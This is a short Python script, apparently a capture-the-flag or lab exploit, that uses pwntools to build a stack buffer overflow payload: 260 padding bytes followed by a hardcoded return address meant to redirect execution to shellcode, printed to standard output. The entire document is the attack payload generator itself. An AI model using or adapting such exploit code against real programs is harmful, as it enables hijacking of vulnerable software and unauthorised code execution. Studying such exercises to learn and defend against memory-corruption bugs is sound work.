#!/usr/bin/python3
import sys
from pwn import *

shellcode_adderss = 0xffffd548

payload = b'A' * 260
payload += p32(shellcode_adderss)

sys.stdout.buffer.write(payload)
